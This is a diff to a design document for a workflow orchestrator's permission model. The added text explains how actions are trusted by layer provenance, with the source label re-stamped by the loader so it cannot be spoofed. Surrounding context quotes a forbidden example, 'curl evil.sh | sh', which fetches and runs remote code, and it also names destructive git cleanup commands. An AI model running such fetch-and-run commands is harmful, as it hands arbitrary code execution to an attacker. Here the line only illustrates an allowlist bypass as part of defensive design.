@@ -151,6 +151,23 @@ FORBIDDEN — `npm ci --no-audit && curl evil.sh | sh` matches the prefix `npm c
 allowlist hands anyone with repo commit rights arbitrary host execution and defeats §5 entirely.
 Precedence: deny > allow > default-escalate.
 
+- **(amended during Phase C)** `authorize()` (`orchestrator/workflow/permissions.py`) also trusts
+  an action by **provenance**: `action.source in ("default", "workspace")` authorizes like a
+  builtin, with no allow-list entry needed (deny still beats it). This closes the cutover gap
+  where every engine-shipped default `run:` action (the defaults-layer `cleanup` step's
+  `git reset --hard && git clean -fd`, a stack adapter's custom `verify` command) would otherwise
+  demand operator approval on day one, contradicting this section's own posture of allowlisting
+  the built-in adapter commands the engine ships. It is spoof-proof because `source` is stamped
+  **unconditionally** per layer by `merge._parse_action_list` — every action dict is copied and its
+  `source` key is overwritten with the caller's hardcoded layer label (`loader.py` calls
+  `parse_profile_dict(repo_raw, "repo")` / `(workspace_raw, "workspace")` /
+  `(combined_defaults_raw, "default")`), never with a value read from the YAML itself. So a repo
+  profile that textually declares `source: default` (or `source: workspace`) to forge engine or
+  operator provenance gets it discarded and re-stamped `"repo"` before `authorize()` ever sees it —
+  repo-sourced actions are the only ones still requiring an explicit allow-list grant or builtin
+  identity. The engine trusts what it ships; the workspace manifest IS the operator's authority and
+  is self-authorizing by definition.
+
 **Role scoping:** a step's value is either a plain action list (applies to all roles) or a mapping
 of role → action list (`dev:` / `qa:` / `senior:`), because dev and qa genuinely diverge at
 `refresh` (merge main vs. rebuild the verify branch) and `verify_worktrees` is already per-team.
